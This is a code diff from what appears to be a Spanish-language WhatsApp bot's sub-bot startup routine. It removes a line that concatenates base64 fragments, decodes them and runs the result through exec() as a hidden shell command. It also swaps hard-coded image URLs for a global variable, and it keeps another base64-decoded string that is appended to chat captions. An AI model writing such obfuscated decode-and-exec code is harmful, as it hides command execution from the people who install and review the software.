@@ -91,9 +91,8 @@ conn.reply(m.chat, `*Use correctamente el comando:* \`${usedPrefix + command} co
 return
 }
 
-const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, 'base64')
-exec(comb.toString('utf-8'), async (err, stdout, stderr) => {
 const drmer = Buffer.from(drm1 + drm2, 'base64')
+;(async () => {
 
 let {version, isLatest} = await fetchLatestBaileysVersion()
 const msgRetry = (MessageRetryMap) => {}
@@ -147,7 +146,7 @@ if (/web|desktop|unknown/i.test(dispositivo)) {
 txtCode = await conn.sendMessage(
 m.chat,
 {
-image: {url: 'https://cdn.dorratz.com/files/1742816530181.jpg' || gataMenu.getRandom()},
+image: global.gataImg,
 caption: rtx2.trim() + '\n' + drmer.toString('utf-8')
 },
 {quoted: m}
@@ -158,7 +157,7 @@ txtCode = await conn.sendButton(
 m.chat,
 rtx2.trim() + '\n' + drmer.toString('utf-8'),
 wm + `\n*Código:* ${secret}`,
-'https://cdn.dorratz.com/files/1742816530181.jpg' || 'https://qu.ax/wyUjT.jpg',
+global.gataImg,
 null,
 [['Copiar código', secret]],
 null,
@@ -170,7 +169,7 @@ m
 txtCode = await conn.sendMessage(
 m.chat,
 {
-image: {url: 'https://cdn.dorratz.com/files/1742816530181.jpg' || gataMenu.getRandom()},
+image: global.gataImg,
 caption: rtx2.trim() + '\n' + drmer.toString('utf-8')
 },
 {quoted: m}
@@ -461,7 +460,7 @@ isInit = false
 return true
 }
 creloadHandler(false)
-})
+})().catch((e) => console.error(chalk.redBright('Sub-bot: arranque fallido'), e))
 }
 
 const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
